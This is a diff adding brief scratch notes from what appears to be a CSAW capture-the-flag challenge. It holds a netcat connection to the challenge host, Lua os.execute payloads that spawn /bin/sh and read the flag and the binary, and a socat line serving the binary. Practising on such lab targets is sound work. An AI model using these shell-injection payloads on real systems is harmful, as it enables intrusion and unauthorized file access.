@@ -1,0 +1,31 @@
+thinking
+
+
+nc pwn.chal.csaw.io 8001
+
+
+
+lua is a scripting thing that runs stuff
+
+
+it's probably a wrapper around the backend program
+
+
+os.execute('/bin/sh')
+
+os.execute('cat flag')
+
+os.execute('cat scripty')
+socat -T10 tcp-l:8000,reuseaddr,fork exec:./scripty,pty,setsid,setpgid,ctty
+
+
+k so we have the game
+
+now to hack that
+
+
+
+
+
+
+
